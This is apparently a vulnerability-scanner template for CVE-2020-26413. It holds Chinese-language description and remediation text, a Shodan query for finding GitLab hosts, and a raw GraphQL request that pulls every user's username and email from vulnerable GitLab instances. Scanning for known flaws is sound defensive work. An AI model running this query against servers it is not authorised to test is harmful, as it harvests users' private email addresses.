id: CVE-2020-26413
info:
  name: Gitlab User enumeration via Graphql API
  author:
  - l0ne1y
  tags:
  - cve
  - cve2020
  - gitlab
  - exposure
  - enum
  - graphql
  description: |-
    Gitlab graphql 敏感信息泄漏漏洞
    GitLab是美国GitLab公司的一款使用Ruby on Rails开发的、自托管的、Git（版本控制系统）项目仓库应用程序。该程序可用于查阅项目的文件内容、提交历史、Bug列表等。

    GitLab CE/EE 13.4 - 13.6.2版本存在信息泄露漏洞，该漏洞源于通过GraphQL公开信息会导致用户邮箱和用户名信息被泄漏。
  reference:
  - https://gitlab.com/gitlab-org/gitlab/-/issues/244275
  - https://gitlab.com/gitlab-org/cves/-/blob/master/2020/cve-2020-26413.json
  - https://nvd.nist.gov/vuln/detail/cve-2020-26413
  severity: medium
  metadata:
    shodan-query: http.title:"GitLab"
  classification:
    cve-id:
    - cve-2020-26413
    cwe-id:
    - cwe-200
    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N
    cvss-score: 5.3
  remediation: |-
    **官方修复方案**
    使用此软件的用户随时关注厂商主页或参考网址以获取解决办法：
    https://gitlab.com/gitlab-org/cves/-/blob/master/2020/CVE-2020-26413.json

    **临时修复方案**
    1、去除页面、cookie或缓存中涉及的敏感信息或删除泄露信息页面
    2、将敏感信息进行加密存储，非必要不可发送前端
    3、发送敏感信息时需加密传输，如有必要需脱敏处理
    4、禁止用自己开发的加密算法，必须使用公开、安全的标准加密算法。
    5、禁止在日志中记录明文的敏感数据：禁止在日志中记录明文的敏感数据（如口
    令、会话标识jsessionid等）， 防止敏感信息泄漏。
    6、禁止带有敏感数据的Web页面缓存：带有敏感数据的Web页面都应该禁止缓
    存，以防止敏感信息泄漏或通过代理服务器上网的用户数据互窜问题。
    7、对必须发送的敏感数据或页面请求接口做好严格的权限认证
requests:
- matchers:
  - type: word
    condition: and
    part: body
    words:
    - '"username":'
    - '"avatarUrl":'
    - '"node":'
  - type: status
    status:
    - 200
  extractors:
  - type: json
    json:
    - .data.users.edges[].node.email
    part: body
  matchers-condition: and
  raw:
  - |
    POST /api/graphql HTTP/1.1
    Host: {{Hostname}}
    Content-Type: application/json

    {
      "query": "{\nusers {\nedges {\n  node {\n    username\n    email\n    avatarUrl\n    status {\n      emoji\n      message\n      messageHtml\n     }\n    }\n   }\n  }\n }",
      "variables": null,
      "operationName": null
    }
